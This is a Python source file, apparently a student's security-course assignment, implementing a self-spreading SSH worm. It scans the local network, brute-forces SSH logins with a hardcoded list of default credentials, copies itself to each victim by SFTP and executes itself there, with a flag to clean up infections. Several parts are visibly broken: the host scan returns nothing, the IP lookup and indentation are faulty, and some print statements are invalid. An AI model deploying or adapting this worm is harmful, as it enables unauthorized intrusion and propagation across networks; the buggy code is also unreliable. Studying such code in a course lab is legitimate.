# Diane Le
# CPSC456 - Spring 2022
# Assignment(1)

import paramiko
import sys
import socket
import nmap
import netinfo
import netifaces
import os

# The list of credentials to attempt
credList = [
('helo', 'world'),
('root', '#Gig#'),
('kali', 'kali'),
('osboxes', 'osboxes.org'),
]

# The file marking whether the worm should spread
INFECTED_MARKER_FILE = "/tmp/infected.txt"
LOCAL_PATH = "/tmp"
WORM_FILE = "/tmp/worm.py"

##################################################################
# Returns whether the worm should spread
# @return - True if the infection succeeded and false otherwise
##################################################################
def isInfectedSystem():
	# Check if the system as infected. One
	# approach is to check for a file called
	# infected.txt in directory /tmp (which
	# you created when you marked the system
	# as infected). 
	return os.path.exists(INFECTED_MARKER_FILE)

#################################################################
# Marks the system as infected
#################################################################
def markInfected():
	
	# Mark the system as infected. One way to do
	# this is to create a file called infected.txt
	# in directory /tmp/
	with open(INFECTED_MARKER_FILE, 'w')as f:
		f.write("You are infected with worms!")

###############################################################
# Spread to the other system and execute
# @param sshClient - the instance of the SSH client connected
# to the victim system
###############################################################
def spreadAndExecute(sshClient):
	
	# This function takes as a parameter 
	# an instance of the SSH class which
	# was properly initialized and connected
	# to the victim system. The worm will
	# copy itself to remote system, change
	# its permissions to executable, and
	# execute itself. Please check out the
	# code we used for an in-class exercise.
	# The code which goes into this function
	# is very similar to that code.	

	sftp = sshClient.open_sftp()

	sftp.put("/tmp/worm.py", "/tmp/worm.py")

	if not isInfectedSystem():
		sftpfile = sftp.file(INFECTED_MARKER_FILE,'w')
		sftpfile.write("You are infected with worms!")
		sftpfile.close()	
  	
	else:
		sftp.put(INFECTED_MARKER_FILE,INFECTED_MARKER_FILE)

		sshClient.exec_command("chmod a+x /tmp/worm.py")
		sshClient.exec_command("nohup python /tmp/worm.py")

	sftp.close()
	sshClient.close()


############################################################
# Try to connect to the given host given the existing
# credentials
# @param host - the host system domain or IP
# @param userName - the user name
# @param password - the password
# @param sshClient - the SSH client
# return - 0 = success, 1 = probably wrong credentials, and
# 3 = probably the server is down or is not running SSH
###########################################################
def tryCredentials(host, userName, password, sshClient):
	
	# Tries to connect to host host using
	# the username stored in variable userName
	# and password stored in variable password
	# and instance of SSH class sshClient.
	# If the server is down	or has some other
	# problem, connect() function which you will
	# be using will throw socket.error exception.	     
	# Otherwise, if the credentials are not
	# correct, it will throw 
	# paramiko.SSHException exception. 
	# Otherwise, it opens a connection
	# to the victim system; sshClient now 
	# represents an SSH connection to the 
	# victim. Most of the code here will
	# be almost identical to what we did
	# during class exercise. Please make
	# sure you return the values as specified
	# in the comments above the function
	# declaration (if you choose to use
	# this skeleton).
	try:
		sshClient.connect(host, username = userName, password = password)
	except socket.error:
		return 3
	except paramiko.SSHException:
		return 1
	return 0

###############################################################
# Wages a dictionary attack against the host
# @param host - the host to attack
# @return - the instace of the SSH paramiko class and the
# credentials that work in a tuple (ssh, username, password).
# If the attack failed, returns a NULL
###############################################################
def attackSystem(host):
	
	# The credential list
	global credList
	
	# Create an instance of the SSH client
	ssh = paramiko.SSHClient()

	# Set some parameters to make things easier.
	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
	
	# The results of an attempt
	attemptResults = None
				
	# Go through the credentials
	for (username, password) in credList:
		
		# TODO: here you will need to
		# call the tryCredentials function
		# to try to connect to the
		# remote system using the above 
		# credentials.  If tryCredentials
		# returns 0 then we know we have
		# successfully compromised the
		# victim. In this case we will
		# return a tuple containing an
		# instance of the SSH connection
		# to the remote system. 
		attemptResults = tryCredentials(host, username, password, ssh)
		if attemptResults == 0:
			return (ssh, username, password)
		if attemptResults == 3:
			print ("Server Down.")
		if attemptResults == 1:
			print ("Incorrect input.")
			
	# Could not find working credentials
	return None	

####################################################
# Returns the IP of the current system
# @param interface - the interface whose IP we would
# like to know
# @return - The IP address of the current system
####################################################
def getMyIP(interface):
	
	# TODO: Change this to retrieve and
	# return the IP of the current system.
    addrs = []
    for dev in netinfo.list_active_devs():
        ip = netinfo.get_ip(dev)
    if not addrs == "127.0.0.1":
        addrs.append(ip)
    return addrs

#######################################################
# Returns the list of systems on the same network
# @return - a list of IP addresses on the same network
#######################################################
def getHostsOnTheSameNetwork():
	
	# TODO: Add code for scanning
	# for hosts on the same network
	# and return the list of discovered
	# IP addresses.	
	portScanner = nmap.PortScanner()

# If we are being run without a command line parameters, 
# then we assume we are executing on a victim system and
# will act maliciously. This way, when you initially run the 
# worm on the origin system, you can simply give it some command
# line parameters so the worm knows not to act maliciously
# on attackers system. If you do not like this approach,
# an alternative approach is to hardcode the origin system's
# IP address and have the worm check the IP of the current
# system against the hardcoded IP. 
def cleaner(sshClient): 
	
	# remove the infection (i.e. marker file) from the host
	# remove the worm program from the host
	sftp = sshClient.open_sftp()
	sftp.remove(LOCAL_PATH + "/worm.py")
	sftp.remove(INFECTED_MARKER_FILE)


	if len(sys.argv) < 2:
	
# TODO: If we are running on the victim, check if 
# the victim was already infected. If so, terminate.
# Otherwise, proceed with malice. 
		if isInfectedSystem():
			exit

# TODO: Get the IP of the current system
currentIPs = getMyIP()


# Get the hosts on the same network
networkHosts = getHostsOnTheSameNetwork()

# TODO: Remove the IP of the current system
# from the list of discovered systems (we
# do not want to target ourselves!).
for ip in currentIPs:
    networkHosts.remove(currentIPs)
    print ("Found hosts: "), networkHosts


# Go through the network hosts
for host in networkHosts:
	
	# Try to attack this host
	sshInfo =  attackSystem(host)
	
	print (sshInfo)
	
	
	# Did the attack succeed?
	if sshInfo:
		
		print ("Trying to spread") + sshInfo
		
		# TODO: Check if the system was	
		# already infected. This can be
		# done by checking whether the
		# remote system contains /tmp/infected.txt
		# file (which the worm will place there
		# when it first infects the system)
		# This can be done using code similar to
		# the code below:
		# try:
        #	 remotepath = '/tmp/infected.txt'
		#        localpath = '/home/cpsc/'
		#	 # Copy the file from the specified
		#	 # remote path to the specified
		# 	 # local path. If the file does exist
		#	 # at the remote path, then get()
		# 	 # will throw IOError exception
		# 	 # (that is, we know the system is
		# 	 # not yet infected).
		# 
		#        sftp.get(filepath, localpath)
		# except IOError:
		#       print "This system should be infected"
		#
		#
		# If the system was already infected proceed.
		# Otherwise, infect the system and terminate.
		# Infect that system
  
		sftp = sshInfo.open_sftp()
		try:
			sftp.stat(INFECTED_MARKER_FILE)
			print (host + (" is infected."))
			sftp.close()

			if len(sys.argv) >=2 and (sys.argv[1] == '-c' or sys.argv[1] == "--clean"):
				print ("Cleaning ") + host
				cleaner (sshInfo)
				print ((" ") +  host + (" successfully cleaned."))
			
			sshInfo.close()

		except IOError:
			
        		sftp.close() 

if len(sys.argv) >=2 and (sys.argv[1] == '-c' or sys.argv[1] == "--clean"):
				
	print (host + " not infected, leaving alone")

else:
	print ("Attempting to spread...")
				
	spreadAndExecute(sshInfo[0])
				
	print ("Successfully Spread.")		

#Cleaning
if len(sys.argv) >=2 and (sys.argv[1] == '-c' or sys.argv[1] == "--clean"):
	if isInfectedSystem():
		os.remove(INFECTED_MARKER_FILE)
	print ("Cleaning Completed!")
else:
	print ("Spreading Completed!")
	
	



	
	

